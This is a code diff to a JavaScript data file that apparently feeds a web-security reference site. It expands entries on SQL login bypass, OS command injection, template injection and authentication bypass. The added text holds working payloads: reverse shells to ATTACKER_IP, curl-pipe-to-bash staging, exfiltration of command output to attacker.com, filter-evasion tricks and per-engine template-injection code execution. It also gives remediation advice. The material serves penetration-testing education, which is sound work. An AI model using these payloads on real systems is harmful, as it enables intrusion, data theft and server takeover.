@@ -308,6 +308,16 @@ var VULNS = [
             ]
           },
           {
+            title: "Authentication Bypass",
+            type: "commands",
+            commands: [
+              { label: "Comment out the password check", cmd: "# query: SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'\n# put the comment after a valid/guessed username:\nusername:  admin'-- -\nusername:  admin'#\nusername:  admin'/*\n# the AND pass='...' clause is now commented away" },
+              { label: "Always-true tautologies", cmd: "' OR '1'='1'-- -\n' OR 1=1-- -\n' OR 'a'='a\nadmin' OR '1'='1'-- -      # log in as the first user (often admin)" },
+              { label: "Target a specific account", cmd: "# make the WHERE match only admin, regardless of password:\n' OR username='admin'-- -\n' UNION SELECT 1,'admin','fakehash',1-- -   # forge a row the app treats as a valid login" },
+              { label: "Second field / numeric variants", cmd: "# if the username is fixed and only the password is injectable:\npassword:  ' OR '1'='1\n# numeric login id:\nid=1 OR 1=1-- -" }
+            ]
+          },
+          {
             title: "Step 2 — Fingerprint the Database",
             type: "commands",
             commands: [
@@ -421,6 +431,18 @@ var VULNS = [
             ]
           },
           {
+            title: "Common Pitfalls & False Positives",
+            type: "notes",
+            items: [
+              "A 500 error on a single quote is a hint, not proof — always confirm with a boolean pair (AND 1=1 vs AND 1=2) or a differential/time test so you are not chasing a generic input-handling error.",
+              "WAFs and rate limiters can make blind extraction look broken: a delayed page might be network jitter, not your SLEEP. Repeat time-based tests and compare against a 0-second baseline.",
+              "Client-side or length filters may strip your comment or quote before it reaches the DB; check the actual bytes that arrive (proxy the request) rather than trusting the browser.",
+              "In numeric contexts a quote is unnecessary and can even break an otherwise-working payload — try both quoted and unquoted forms.",
+              "Some frameworks silently coerce or cast types (e.g. a non-numeric id becomes 0), producing a changed response that is not injection — verify with arithmetic (3-1) rather than assuming.",
+              "Escaping a quote (\\') is not safe on MySQL if the connection charset allows multi-byte tricks (GBK) — but modern stacks are mostly immune; do not report it without a working proof."
+            ]
+          },
+          {
             title: "References",
             type: "references",
             items: [
@@ -529,46 +551,98 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/os-command-injection",
         description: "User input reaches a system shell command, letting an attacker run arbitrary commands on the server.",
-        brief: "Command injection occurs when an application builds an OS command from unsanitised input and passes it to a shell. Shell metacharacters (;, |, &, `, $()) let the attacker append or substitute their own commands, which run with the web process's privileges.\n\nImpact: direct code execution on the host — read secrets, pivot internally, and take full control. It appears wherever an app shells out: ping/traceroute tools, file/PDF/image converters, backup and export features.",
+        brief: "OS command injection occurs when an application constructs an operating-system command from user-controlled input and hands it to a shell (system(), exec, popen, backticks, Runtime.exec with sh -c, child_process.exec). Because the shell parses metacharacters — ; | & && || ` $() newline — before executing, an attacker who controls any part of that string can terminate the intended command and append their own, or substitute a sub-command inline. Every injected command runs with the privileges of the web process.\n\nIt is distinct from code injection (which runs code in the app's own language) and from argument injection (where you cannot add a new command but can smuggle extra flags into the existing binary to change its behaviour — e.g. adding an output-file flag to a converter). Both are covered here because testers meet them together.\n\nConsequences are as severe as it gets: read application secrets and the filesystem, establish an interactive reverse shell, move laterally to internal services the host can reach, and ultimately take full control of the server. Command injection hides wherever an app shells out to do work it could not easily do in-language: ping/traceroute/nslookup diagnostics, DNS and whois lookups, image/PDF/video conversion (ImageMagick, ffmpeg, ghostscript), archive handling (zip/tar/unzip), git operations, backup and export routines, and antivirus or document-processing pipelines.",
         quickReference: [
-          { label: "Command separators", cmd: "; id    | id    & id    && id    %0a id" },
-          { label: "Inline substitution", cmd: "$(id)    `id`" },
-          { label: "Blind out-of-band confirm", cmd: "; nslookup $(whoami).attacker.oastify.com" },
-          { label: "Blind time-based", cmd: "; ping -c 5 127.0.0.1   ; sleep 5" }
+          { label: "Command separators", cmd: "; id    | id    & id    && id    || id    %0a id    %0d%0a id" },
+          { label: "Inline substitution (works inside quotes)", cmd: "$(id)    `id`    ${IFS}   (space-free)" },
+          { label: "Blind out-of-band confirm", cmd: "& nslookup `whoami`.attacker.oastify.com &" },
+          { label: "Blind time-based", cmd: "& ping -c 10 127.0.0.1 &    ; sleep 10    & timeout 10 &  (Windows)" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "The app passes a string to a shell interpreter (/bin/sh -c \"...\" or cmd.exe /c \"...\"). The shell — not the app — parses that string, and it treats metacharacters as control operators, so attacker data becomes attacker commands.",
+              "The dangerous pattern is a shell-invoking API given a single command string: PHP system/exec/shell_exec/passthru/backticks, Python os.system / subprocess with shell=True, Node child_process.exec, Java Runtime.getRuntime().exec(\"sh -c \"+x), Ruby system(\"...#{x}\") / backticks.",
+              "The safe pattern is an exec API that takes the program and an argv array with no shell: subprocess.run([\"ping\",\"-c\",\"1\",host]) , execFile('ping',['-c','1',host]) , ProcessBuilder(\"ping\",\"-c\",\"1\",host). No shell means no metacharacter parsing.",
+              "Argument injection is a subtler variant: even without a separator, if your value becomes an argument you may inject extra flags (a leading - ) that change the binary's behaviour — e.g. turning a filename into an output-file or config option.",
+              "Results-based injection returns command output in the response; blind injection returns nothing, so you confirm via a time delay or an out-of-band callback instead."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Network diagnostic tools: ping, traceroute, nslookup, dig, whois, host — the textbook sink, and still common in router/IoT/admin panels.",
+              "Media & document processing: image thumbnailers and converters (ImageMagick 'ImageTragick', ghostscript), PDF generation, ffmpeg, LibreOffice/unoconv, OCR.",
+              "File operations: archive extract/create (zip, tar, unzip, 7z), file-type detection, virus scanning, backup/restore, log processing.",
+              "DevOps-flavoured features: git clone/pull of a user-supplied URL, running build or deploy scripts, 'test connection' buttons, SSRF-adjacent fetchers that shell out to curl/wget.",
+              "Any parameter that ends up as a filename, hostname, URL, or path in a shelled-out command — including values arriving via headers, filenames of uploads, and stored fields used later."
+            ]
+          },
+          {
+            title: "Step 1 — Detect Command Execution",
             type: "commands",
             commands: [
-              { label: "1. Suspect any feature that shells out", cmd: "# ping/nslookup/whois tools, file converters, pdf/image processing, zip/tar,\n# git operations, 'run diagnostics' buttons -> prime candidates\nhost=127.0.0.1; id   # append a command to a ping parameter" },
-              { label: "2. Results-based — see command output in the response", cmd: "host=127.0.0.1; id\nhost=127.0.0.1 | whoami\nhost=127.0.0.1 && cat /etc/passwd" },
-              { label: "3. Blind time-based — no output, infer from delay", cmd: "host=127.0.0.1; sleep 5     # response delayed 5s = injectable\nhost=127.0.0.1; ping -c 5 127.0.0.1" },
-              { label: "4. Blind out-of-band — trigger a callback", cmd: "host=127.0.0.1; nslookup $(whoami).oob.attacker.com\n# a DNS/HTTP hit on your Collaborator/OAST host confirms + exfils output" },
-              { label: "5. Automate + escalate to a shell", cmd: "commix -u 'https://target/tools/ping?host=127.0.0.1' --level 2\n# then a reverse shell (in scope): ; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'" }
+              { label: "Results-based: append a command and read the output", cmd: "# original: ping -c 1 <host>\nhost=127.0.0.1;id\nhost=127.0.0.1|id\nhost=127.0.0.1&&id\nhost=127.0.0.1`id`\nhost=127.0.0.1$(id)\n# uid=... in the response = confirmed execution" },
+              { label: "Blind time-based (most reliable)", cmd: "# unix\nhost=127.0.0.1;sleep 10\nhost=127.0.0.1&ping -c 10 127.0.0.1&\n# windows\nhost=127.0.0.1&ping -n 10 127.0.0.1&\nhost=127.0.0.1&timeout 10&\n# a ~10s delay vs an instant baseline = injection" },
+              { label: "Blind out-of-band (confirms AND exfiltrates)", cmd: "# fire a DNS/HTTP lookup to a listener you control (Collaborator/interactsh)\nhost=127.0.0.1&nslookup `whoami`.oob.attacker.com&\nhost=127.0.0.1&curl http://oob.attacker.com/$(id|base64)&\n# the callback subdomain/path carries the command output" },
+              { label: "Try every context & separator", cmd: "# if the value is quoted in the command, break out first:\n\" ; id ;\"      ' ; id ;'\n# newline injection when the parser is line-based:\nhost=127.0.0.1%0aid" }
+            ]
+          },
+          {
+            title: "Step 2 — Space & Filter Bypass",
+            type: "commands",
+            commands: [
+              { label: "No spaces allowed", cmd: "# ${IFS} is the shell's internal field separator (a space)\ncat${IFS}/etc/passwd\ncat$IFS$9/etc/passwd\n# brace expansion needs no spaces:\n{cat,/etc/passwd}\n# tab or newline instead of space:\ncat%09/etc/passwd" },
+              { label: "Keyword/blocklist evasion", cmd: "# quotes and concatenation break signature matching but the shell ignores them:\nc\"a\"t /etc/passwd     ca''t /etc/passwd\nwho$@ami            /bin/c?t /etc/passwd   (glob)\n# base64 the whole command:\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh" },
+              { label: "Avoid blocked slashes / paths", cmd: "# build / from a variable:\ncat ${HOME:0:1}etc${HOME:0:1}passwd\n# or use IFS/glob tricks to reach files without literal slashes" },
+              { label: "Windows-specific", cmd: "# separators: & && | \n# variable insertion breaks signatures: wh^oami   who^ami\n# powershell base64: powershell -enc <b64-utf16le>" }
             ]
           },
           {
             title: "Injection Contexts",
             type: "table",
-            columns: ["Context", "Break-out"],
+            columns: ["Context in the command", "How to break out / inject"],
             rows: [
-              ["Unquoted argument", "Any separator: ; | & && ||"],
-              ["Inside double quotes", "$(cmd) / `cmd` still execute"],
-              ["Inside single quotes", "Close the quote first: ' then the payload"],
-              ["Newline-sensitive parsers", "%0a injects a new command line"],
-              ["Argument injection", "Extra flags (e.g. -o) change behaviour without a separator"]
+              ["Unquoted argument", "Any separator works: ; | & && || newline"],
+              ["Inside double quotes \"...$x...\"", "$(cmd) and `cmd` still execute; or close with \""],
+              ["Inside single quotes '...$x...'", "Metacharacters are literal — close the quote first: ' then payload then '"],
+              ["Line-based parser", "%0a (newline) starts a fresh command line"],
+              ["Value becomes a flag/filename", "Argument injection: prefix with - to add options (no separator needed)"],
+              ["Windows cmd.exe", "& && | separators; ^ escapes to defeat filters"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Step 3 — Exploit: Shell & Exfiltration",
+            type: "commands",
+            commands: [
+              { label: "Interactive reverse shell (authorised only)", cmd: "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'\n; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\n# listener: nc -lvnp 443   (upgrade the tty with script/pty afterwards)" },
+              { label: "Blind: exfiltrate output over DNS/HTTP", cmd: "# when you cannot see stdout, ship it out-of-band\n& curl -s http://oob.attacker.com/$(id | base64 -w0) &\n& for c in $(id); do nslookup $c.oob.attacker.com; done &" },
+              { label: "Stage a fuller shell", cmd: "# pull and run a script when curl/wget is available\n; curl -s http://ATTACKER/x.sh | bash\n; wget -qO- http://ATTACKER/x.sh | sh" },
+              { label: "Argument-injection example", cmd: "# a 'convert' feature: convert <userfile> out.png\n# supply a value starting with - to smuggle an option, or abuse tool-specific\n# flags (e.g. gnuplot -e, tar --checkpoint-action=exec) to gain execution" }
+            ]
+          },
+          {
+            title: "Step 4 — Automate with Commix",
+            type: "commands",
+            commands: [
+              { label: "Point at a parameter", cmd: "commix -u 'https://target/tools/ping?host=127.0.0.1'\ncommix -u 'https://target/ping' --data='host=127.0.0.1' -p host" },
+              { label: "From a captured request", cmd: "commix -r request.txt --level 3" },
+              { label: "Get a shell / tune technique", cmd: "commix -u '...' --os-cmd='id'          # single command\ncommix -u '...' --os-shell             # pseudo-shell\ncommix -u '...' --technique=t           # t=time-based, f=file-based, etc." }
+            ]
+          },
+          {
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "Find a shell-adjacent feature", "Candidate injection point"],
-              ["2", "Confirm (output / delay / OOB)", "Verified command execution"],
-              ["3", "Run a reverse shell", "Interactive access as the web user"],
-              ["4", "Escalate / pivot internally", "Host and network compromise"]
+              ["2", "Confirm via output / delay / OOB", "Verified command execution as the web user"],
+              ["3", "Read secrets (env, config, keys)", "Credentials for DBs, cloud, internal APIs"],
+              ["4", "Establish a reverse shell", "Interactive foothold on the host"],
+              ["5", "Privilege-escalate + pivot", "Root on the box, access to the internal network"]
             ]
           },
           {
@@ -576,16 +650,20 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Commix", "Automated command-injection detection and exploitation"],
-              ["Burp Suite (Collaborator)", "Manual testing and blind OOB detection"],
-              ["Interactsh / OAST", "Out-of-band confirmation for blind cases"]
+              ["Commix", "Automated command-injection detection and exploitation (incl. blind)"],
+              ["Burp Suite + Collaborator", "Manual probing and blind out-of-band detection"],
+              ["interactsh / OAST", "Catch DNS/HTTP callbacks for blind confirmation and exfil"],
+              ["netcat / socat", "Reverse-shell listener and tty upgrade"],
+              ["GTFOBins", "Reference for turning an allowed binary into execution/priv-esc"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — OS command injection", url: "https://portswigger.net/web-security/os-command-injection" },
+              { label: "PortSwigger — OS command injection (with labs)", url: "https://portswigger.net/web-security/os-command-injection" },
+              { label: "OWASP WSTG — Testing for Command Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" },
+              { label: "OWASP — OS Command Injection Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" },
               { label: "PayloadsAllTheThings — Command Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" }
             ]
           },
@@ -593,11 +671,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Avoid calling the shell — use language APIs (e.g. a DNS library instead of nslookup).",
-              "If you must run a binary, use an exec form that passes arguments as an array, never a single shell string.",
-              "Never pass user input into the command; where a value is required, validate against a strict allow-list.",
-              "Run the web process with least privilege to contain a foothold.",
-              "Fix the code — a WAF blocking obvious payloads is trivially bypassed."
+              "Do not invoke a shell at all where you can avoid it — use a native language API instead of shelling out (a DNS resolver library instead of nslookup, an image library instead of calling convert).",
+              "When you must run an external binary, use the array/exec form that bypasses the shell and passes arguments as a list: subprocess.run([...], shell=False), child_process.execFile, ProcessBuilder, pcntl_exec — never build a single command string.",
+              "Never place user input in the command name or as raw arguments; where a value is required, validate it against a strict server-side allow-list (e.g. a fixed set of hostnames, or a numeric/charset pattern), and reject everything else.",
+              "Guard against argument injection by prefixing user values with -- (end-of-options) where the tool supports it, and by validating that a value cannot begin with - when it must not be a flag.",
+              "Run the web process as an unprivileged user, in a container or with seccomp/AppArmor, so a successful injection is contained rather than instant root.",
+              "Do not rely on a WAF or blacklisting metacharacters — the space/keyword bypasses above defeat that; fix the call site."
             ]
           }
         ]
@@ -608,46 +687,100 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/server-side-template-injection",
         description: "User input is evaluated by a server-side template engine, often escalating to remote code execution.",
-        brief: "SSTI happens when user input is embedded into a template rendered server-side, so it is interpreted as template code rather than data. Because template engines are small interpreters, this usually escalates from information disclosure to full command execution via documented sandbox escapes.\n\nImpact: RCE on the server. It is increasingly common as apps build emails, pages, and documents from templates with user-controlled fields. The tell is that a math expression in the template syntax gets evaluated.",
+        brief: "Server-Side Template Injection occurs when user input is concatenated into a template that a server-side engine then evaluates, so the input is parsed as template syntax rather than treated as data to be rendered. Template engines (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, Handlebars, Pug, and many more) are effectively small programming languages, so control over the template usually means control over that language — and from there, over the host process.\n\nThe critical distinction from XSS is where the code runs: XSS executes in the victim's browser, while SSTI executes on the server. A payload like {{7*7}} that comes back as 49 proves the server evaluated your input. From that foothold, most engines expose a documented path from the template sandbox down to the underlying language's object model, and from there to os/Runtime and command execution. Even engines marketed as 'sandboxed' have a long history of escape gadgets.\n\nSSTI is increasingly common because modern apps build HTML pages, emails, PDFs, invoices, and notification messages from templates whose fields (a name, a subject line, a profile bio, a filename) are user-controlled. Impact ranges from reading server-side context and secrets, through arbitrary file access, up to full remote code execution — which is why a confirmed SSTI is treated as critical even before RCE is demonstrated.",
         quickReference: [
-          { label: "Detection probes", cmd: "{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  {7*7}  -> look for 49" },
-          { label: "Distinguish Jinja2 vs Twig", cmd: "{{7*'7'}}  -> 7777777 (Jinja2) or 49 (Twig)" },
-          { label: "Jinja2 RCE (concept)", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
+          { label: "Detection probes", cmd: "{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {7*7}   ${{7*7}}   #{7*7}  -> look for 49" },
+          { label: "Distinguish Jinja2 vs Twig", cmd: "{{7*'7'}}  ->  7777777 (Jinja2/Python)  or  49 (Twig/PHP)" },
+          { label: "Jinja2 RCE", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
           { label: "Automate", cmd: "python3 sstimap.py -u 'https://target/page?name=x' --os-shell" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "The dangerous pattern is building the template text from input: render('Hello '+name) or Template('Hi '+name).render(). The engine compiles that combined string, so name is executed as template code.",
+              "The safe pattern passes input as a context variable to a fixed template: render('hello.html', name=name) — the engine escapes/quotes the value and never parses it as syntax.",
+              "Because template languages expose object attributes, filters, and function calls, an attacker who can write expressions can usually reach the host language's built-ins (Python's __globals__/__builtins__, Java reflection, Ruby's Kernel) and call into os/Runtime.",
+              "SSTI often masquerades as XSS at first glance: if your HTML/JS reflects but {{7*7}} does NOT evaluate, it is XSS; if 7*7 becomes 49 server-side, it is SSTI (and may be both).",
+              "The engine may run inside a sandbox that blocks obvious gadgets; escapes work by pivoting through allowed objects to forbidden ones (subclass walking, __mro__, gadget chains)."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Anywhere the app generates text from a template with a user-supplied field: welcome/notification emails, password-reset messages, personalised pages, PDF/invoice/report generation, and error pages that echo input.",
+              "Content-management and 'custom template'/'email template' features where users legitimately edit templates — often SSTI by design if not sandboxed.",
+              "Fields that feel innocuous: display name, subject line, filename, address, comment, and any value reflected into a rendered document.",
+              "Marketing/CRM and low-code tools that let users embed merge tags or expressions.",
+              "Note the reflection first, then test whether it is evaluated (SSTI) or merely inserted (XSS)."
+            ]
+          },
+          {
+            title: "Step 1 — Detect & Fingerprint",
             type: "commands",
             commands: [
-              { label: "1. Detect — inject a math probe in each reflected field", cmd: "# names, subjects, profile fields, error messages\nname={{7*7}}     # rendered 49 = server-side evaluation (not XSS)\nname=${7*7}      # dollar-brace engines\nname=<%= 7*7 %>  # ERB" },
-              { label: "2. Fingerprint the engine", cmd: "{{7*'7'}}  ->  7777777 means Jinja2 (Python), 49 means Twig (PHP)\n# match the rendered result to the engine, then use that engine's escape" },
-              { label: "3. Jinja2 escape to RCE (sandbox breakout)", cmd: "{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate classes\n{{ cycler.__init__.__globals__.os.popen('id').read() }}   # execute" },
-              { label: "4. Other engines' exec paths", cmd: "# Twig:      {{['id']|filter('system')}}\n# Freemarker:${'freemarker.template.utility.Execute'?new()('id')}\n# Velocity/Smarty have documented exec gadgets too" },
-              { label: "5. Automate + get a shell", cmd: "python3 sstimap.py -u 'https://target/greet?name=x' --os-cmd id\npython3 sstimap.py -u 'https://target/greet?name=x' --os-shell" }
+              { label: "Fire polyglot math probes", cmd: "# try each syntax in every reflected field; a numeric result (49) = SSTI\n{{7*7}}      # Jinja2, Twig, Nunjucks\n${7*7}       # Freemarker, Velocity, JSP EL\n<%= 7*7 %>   # ERB (Ruby)\n#{7*7}       # Ruby string interp, Slim, Pug\n{7*7}        # Smarty\n${{7*7}}  @(7*7)  {{=7*7}}   # other engines" },
+              { label: "Distinguish look-alikes", cmd: "# {{7*7}} -> 49 could be Jinja2 or Twig; disambiguate:\n{{7*'7'}}  ->  7777777  = Jinja2 (Python string repeat)\n{{7*'7'}}  ->  49       = Twig (numeric)\n# {{7*7}} not evaluated but {%7*7%} or ${7*7} is -> different family" },
+              { label: "Use the PortSwigger decision probe", cmd: "# escalate a generic ${{<%[%'\"}}%\\  and observe which errors/renders,\n# then follow the fingerprint down to the exact engine before crafting RCE" }
+            ]
+          },
+          {
+            title: "Step 2 — Escalate to RCE by Engine",
+            type: "commands",
+            commands: [
+              { label: "Jinja2 / Python", cmd: "# enumerate reachable classes, then call os\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}  (Flask)" },
+              { label: "Twig / PHP", cmd: "{{ ['id']|filter('system') }}\n{{ ['id',1]|sort('system') }}\n{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}" },
+              { label: "Freemarker / Velocity (Java)", cmd: "# Freemarker\n<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}\n# Velocity\n#set($e='e');$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')" },
+              { label: "ERB / Ruby, Smarty / PHP", cmd: "# ERB\n<%= system('id') %>   <%= `id` %>   <%= IO.popen('id').read %>\n# Smarty\n{system('id')}   {php}system('id');{/php}   {Smarty_Internal_Write_File::writeFile(...)}" },
+              { label: "Node (Nunjucks / Handlebars / Pug)", cmd: "# Nunjucks\n{{ range.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')() }}\n# Pug\n#{ global.process.mainModule.require('child_process').execSync('id') }" }
             ]
           },
           {
             title: "Engine Fingerprint",
             type: "table",
-            columns: ["Rendered probe", "Likely engine"],
+            columns: ["Rendered probe", "Likely engine(s)", "Language"],
             rows: [
-              ["{{7*7}} → 49", "Jinja2 (Python), Twig (PHP)"],
-              ["${7*7} → 49", "Freemarker, Velocity (Java)"],
-              ["<%= 7*7 %> → 49", "ERB (Ruby)"],
-              ["{7*7} → 49", "Smarty (PHP)"],
-              ["{{7*'7'}} → 7777777", "Jinja2 (repeats) vs Twig (49)"]
+              ["{{7*7}} → 49", "Jinja2, Twig, Nunjucks", "Python / PHP / Node"],
+              ["{{7*'7'}} → 7777777", "Jinja2", "Python"],
+              ["{{7*'7'}} → 49", "Twig", "PHP"],
+              ["${7*7} → 49", "Freemarker, Velocity, JSP EL", "Java"],
+              ["<%= 7*7 %> → 49", "ERB", "Ruby"],
+              ["{7*7} → 49", "Smarty", "PHP"],
+              ["#{7*7} → 49", "Pug, Slim, Ruby interp", "Node / Ruby"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Sandbox Escapes & Filter Bypass",
+            type: "notes",
+            items: [
+              "Attribute-access filters (blocking __ or .) are bypassed with brackets and request args: obj['__class__'] , or {{ request['application'] }} ; Jinja2 also has attr() and |attr('__class__').",
+              "When keywords like os or popen are filtered, build them from concatenation or hex/char, or reach them via a different gadget (subprocess, importlib, __import__).",
+              "Sandboxed Jinja2 (SandboxedEnvironment) still falls to gadget chains through allowed globals like cycler, joiner, namespace, lipsum, and request.",
+              "Twig sandbox is escaped via _self and registerUndefinedFilterCallback; Freemarker via ?new() on utility classes unless the resolver is restricted.",
+              "If direct RCE is blocked, SSTI still yields file read, secret disclosure from the render context (config, request, environment), and SSRF — report those even when the sandbox holds."
+            ]
+          },
+          {
+            title: "Step 3 — Automate with SSTImap",
+            type: "commands",
+            commands: [
+              { label: "Detect", cmd: "python3 sstimap.py -u 'https://target/greet?name=test'\npython3 sstimap.py -u 'https://target/greet' -d 'name=test' -p name" },
+              { label: "From a captured request", cmd: "python3 sstimap.py -r request.txt" },
+              { label: "Execute / shell", cmd: "python3 sstimap.py -u '...' --os-cmd 'id'\npython3 sstimap.py -u '...' --os-shell\npython3 sstimap.py -u '...' --eval-command \"...\"    # in-template eval" }
+            ]
+          },
+          {
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Reflect a math probe", "Confirm server-side evaluation"],
-              ["2", "Fingerprint the engine", "The correct escape chain"],
-              ["3", "Escape the sandbox to language internals", "Access to os/Runtime"],
-              ["4", "Execute OS commands", "RCE on the server"]
+              ["1", "Reflect a math probe (7*7 → 49)", "Confirmed server-side evaluation"],
+              ["2", "Fingerprint the exact engine", "Correct escape chain selected"],
+              ["3", "Read render context / files", "Secrets, config, source disclosure"],
+              ["4", "Escape sandbox to language internals", "Access to os / Runtime / child_process"],
+              ["5", "Execute OS commands / reverse shell", "RCE on the server, then pivot"]
             ]
           },
           {
@@ -655,16 +788,18 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["SSTImap", "Detect and exploit SSTI to RCE across engines"],
-              ["Burp Suite", "Manual probing and reflection analysis"],
-              ["tplmap (legacy)", "Older automation; SSTImap is the maintained successor"]
+              ["SSTImap", "Detect and exploit SSTI to RCE across many engines"],
+              ["tplmap (legacy)", "Older automation; SSTImap is the maintained successor"],
+              ["Burp Suite", "Manual probing, reflection analysis, distinguishing SSTI from XSS"],
+              ["interactsh / Collaborator", "Blind confirmation via OOB callbacks where nothing reflects"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — Server-side template injection", url: "https://portswigger.net/web-security/server-side-template-injection" },
+              { label: "PortSwigger — Server-side template injection (with labs)", url: "https://portswigger.net/web-security/server-side-template-injection" },
+              { label: "PortSwigger research — SSTI: RCE for the modern web app", url: "https://portswigger.net/research/server-side-template-injection" },
               { label: "PayloadsAllTheThings — SSTI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" }
             ]
           },
@@ -672,10 +807,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Never pass user input into the template string; pass it as rendering data/context, which the engine treats as inert.",
-              "Use a logic-less or sandboxed engine and keep the sandbox enabled and updated.",
-              "Validate and allow-list any input that must influence template selection.",
-              "Treat confirmed SSTI as potential RCE; stop exploitation at a benign proof (id) unless in scope."
+              "Never build the template from user input. Pass user data as context variables to a static, pre-defined template so the engine treats it as inert data (render('hello.html', name=name), not render('Hi '+name)).",
+              "Do not offer user-editable templates unless you must; if you do, use a genuinely logic-less engine (e.g. a strict Mustache/Handlebars config) that cannot access objects or call functions.",
+              "If a sandbox is unavoidable, keep the engine and its sandbox fully patched, restrict the exposed object/filter set to the minimum, and treat the sandbox as defence-in-depth, not a guarantee.",
+              "Validate and allow-list any input that legitimately selects a template (a fixed set of template names), and never let input choose an arbitrary template path.",
+              "Run the app with least privilege and isolation so that even a successful escape is contained.",
+              "Treat any confirmed SSTI as potential RCE; when testing, stop at a benign proof (7*7 or id) unless full exploitation is explicitly in scope."
             ]
           }
         ]
@@ -1639,23 +1776,54 @@ var VULNS = [
         severity: "Critical",
         ref: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
         description: "Flaws in login, session, or recovery logic that let an attacker authenticate without valid credentials.",
-        brief: "Authentication is meant to prove who you are; a bypass defeats that proof. The weaknesses are diverse — logic flaws in the login flow, broken multi-factor steps, predictable or improperly invalidated session tokens, and flawed password-reset mechanisms — but they share an outcome: access to an account without the legitimate credential.\n\nImpact: account takeover, MFA defeat, and — for a systemic reset/session flaw — mass compromise. This entry covers the flow-level failures; injection-based bypasses (SQL/NoSQL/LDAP) and token forgery (JWT) have their own entries.",
+        brief: "Authentication exists to prove a user is who they claim to be; an authentication bypass defeats that proof and grants access without a valid credential. Unlike a single technical bug, this is a family of flaws spread across the whole identity lifecycle — the login flow, multi-factor steps, 'remember me' and SSO paths, session handling, and account recovery — that share one outcome: getting into an account (often a privileged one) you should not.\n\nThe failures cluster into recognisable classes. Broken MFA (the second factor is enforced only in the UI, its verified state is client-controlled, or the post-MFA endpoint is reachable directly). Login logic flaws (username enumeration that narrows the attack, no rate-limiting so credential stuffing and brute force succeed, response manipulation where the client is trusted to report success). Broken session management (the session id is not regenerated on login, is predictable, or is never invalidated on logout). Password-reset weaknesses (guessable or non-expiring tokens, tokens not bound to the requesting user, and reset links whose host comes from the attacker-controlled Host header). And leftover default or test accounts.\n\nImpact ranges from single-account takeover to mass compromise when the flaw is systemic (a predictable reset-token scheme, a session id that can be fixed for any victim). This entry covers the flow- and logic-level failures; injection-based login bypasses (SQL/NoSQL/LDAP) and cryptographic token forgery (JWT) are documented in their own entries and frequently chain with these.",
         quickReference: [
-          { label: "MFA step skippable", cmd: "Complete step 1, then request the post-MFA endpoint directly" },
-          { label: "Response tampering", cmd: "Change {\"success\":false} / 2FA result at the client where the server trusts it" },
-          { label: "Password reset flaws", cmd: "Predictable token, token not bound to user, host-header poisoning of reset link" },
-          { label: "Session issues", cmd: "Session not rotated on login, weak/guessable IDs, no expiry, fixation" }
+          { label: "MFA step skippable", cmd: "Finish step 1, then request the post-MFA endpoint directly (forced browsing)" },
+          { label: "Response tampering", cmd: "Flip {\"success\":false}/{\"mfa\":\"fail\"} in the response where the client is trusted" },
+          { label: "Reset-link poisoning", cmd: "POST /reset  Host: attacker.com  -> victim's link points to you" },
+          { label: "Session fixation", cmd: "Plant a known session id pre-login; if it survives auth, ride it" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Where It Lives",
+            type: "notes",
+            items: [
+              "The recurring root cause is trusting the client to enforce or report an authentication decision that only the server should make and check.",
+              "Login: is every attempt rate-limited and account-lockout aware? Do error messages, timing, or status codes differ for valid vs invalid usernames (enumeration)?",
+              "MFA / step-up: is the second factor verified server-side on every protected request, or can the authenticated-but-not-MFA'd session reach protected endpoints?",
